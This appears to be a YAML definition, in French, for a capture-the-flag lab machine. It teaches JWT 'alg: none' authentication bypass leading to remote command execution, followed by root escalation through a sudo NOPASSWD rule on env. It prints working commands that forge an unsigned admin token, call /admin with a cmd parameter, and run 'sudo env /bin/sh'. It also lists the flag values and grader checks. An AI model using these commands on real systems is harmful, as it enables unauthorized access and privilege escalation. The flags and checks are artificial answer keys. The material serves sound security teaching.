@@ -1,0 +1,101 @@
+title: Sablier
+track: offensif
+machine_os: linux
+level: avance
+order: 9
+tags: [machine, web, jwt, contournement authentification, alg none, rce, élévation de privilèges, sudo, env, linux, cve]
+summary: Machine Difficile Linux - l'authentification JWT accepte l'algorithme « none », donc on forge un jeton admin sans signature, on accède à une console d'administration (RCE), puis un sudo env mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{s4bl13r_jwt_alg_n0ne}"
+  root: "TDM{s4bl13r_sud0_env_r00t}"
+description: |
+  **Machine : Sablier · Difficile · 🐧 Linux**
+
+  La cible héberge « Sablier RH », protégé par des **jetons JWT**. Comme sur une machine Hack The Box,
+  récupère un jeton, analyse sa structure, et vois si tu peux la retourner contre le serveur pour te faire
+  passer pour un administrateur. Objectif : drapeau **utilisateur** (`user.txt`) puis élévation vers le
+  drapeau **root** (`root.txt`).
+
+  La **cible** est isolée sur le réseau interne du lab : elle ne peut rien atteindre à l'extérieur. **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : connecte-toi en invité (`/connexion?nom=invite&mdp=invite`) pour obtenir un **JWT**.
+  2. Un JWT = `entête.charge.signature` en base64url. Décode l'entête et la charge. L'espace admin exige
+     `role=admin`. La vérification accepte-t-elle l'algorithme **`none`** ? Forge alors un jeton
+     `{"alg":"none"}` avec `role=admin` **sans signature**.
+  3. Avec ce jeton, `/admin?token=...&cmd=...` exécute des commandes (RCE en tant que `sablier`). Lis
+     `user.txt`.
+  4. `sudo -l` : un binaire lançable en root sans mot de passe permet (voir *GTFOBins*) de lancer
+     n'importe quelle commande en root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `python3`, `base64`, `jq`.
+cours: |
+  ## Contournement d'authentification JWT (alg: none) et élévation par sudo
+
+  ### JWT et l'algorithme « none »
+
+  Un **JWT** (JSON Web Token) est fait de trois parties base64url : `entête.charge.signature`. L'entête
+  déclare l'algorithme de signature (`HS256`, `RS256`...). La faille historique : certaines
+  bibliothèques **acceptent `alg: none`**, c'est-à-dire un jeton **sans signature**. L'attaquant forge
+  alors n'importe quelle charge (ici `role=admin`) et le serveur lui fait confiance. CVE marquantes :
+  **CVE-2015-9235** (jsonwebtoken), **CVE-2016-5431**, **CVE-2018-1000531** (jjwt).
+
+  ```
+  H=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
+  P=$(printf '{"role":"admin"}'           | base64 | tr '+/' '-_' | tr -d '=')
+  JWT="$H.$P."
+  curl -s -G http://cible/admin --data-urlencode "token=$JWT" --data-urlencode "cmd=id"
+  ```
+
+  ### Élévation de privilèges par sudo (GTFOBins)
+
+  `sudo -l` montre `(root) NOPASSWD: /usr/bin/env`. `env` lance une commande dans un environnement
+  modifié - donc **n'importe quelle commande** en root (*GTFOBins*) :
+
+  ```
+  sudo env cat /root/root.txt
+  sudo env /bin/sh            # shell root
+  ```
+
+  ### Côté défense
+
+  Pour JWT : **refuser `alg: none`**, fixer l'algorithme attendu côté serveur, vérifier la signature avec
+  une clé forte. Pour sudo : ne jamais accorder `NOPASSWD` sur `env` (ni sur aucun binaire capable de
+  lancer d'autres commandes).
+docs:
+  - title: OWASP - JSON Web Token Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
+  - title: GTFOBins - env
+    url: https://gtfobins.github.io/gtfobins/env/
+exercises:
+  - id: reconnaissance
+    title: Obtenir un jeton
+    description: |
+      Connecte-toi en invité et récupère le JWT renvoyé. Enregistre la réponse dans
+      `/root/reponses/jwt.txt`.
+    hint: "curl -s 'http://cible/connexion?nom=invite&mdp=invite' | tee /root/reponses/jwt.txt"
+    cours: |
+      Obtenir un jeton valide te permet d'analyser sa structure (entête/charge/signature) et de repérer
+      l'algorithme utilisé - première étape avant de tenter le contournement.
+    checks:
+      - desc: Un jeton JWT a été obtenu
+        run: grep -Eq '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.' /root/reponses/jwt.txt
+  - id: jwt
+    title: Forger un jeton admin (alg none)
+    description: |
+      Forge un JWT `alg:none` avec `role=admin`, utilise-le sur `/admin` pour exécuter `id` **sur la
+      cible**, et enregistre la sortie (`uid=...(sablier)`) dans `/root/reponses/admin.txt`.
+    hint: |
+      H=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
+      P=$(printf '{"role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
+      curl -s -G http://cible/admin --data-urlencode "token=$H.$P." --data-urlencode 'cmd=id' | tee /root/reponses/admin.txt
+    cours: |
+      Un jeton forgé accepté prouve le contournement d'authentification ; la sortie de `id` prouve la RCE
+      et t'indique l'utilisateur (`sablier`). De là tu lis `user.txt` puis tu cherches l'élévation.
+    checks:
+      - desc: Le jeton forgé donne un accès admin et exécute du code en tant que sablier
+        run: grep -q 'uid=' /root/reponses/admin.txt && grep -q 'sablier' /root/reponses/admin.txt
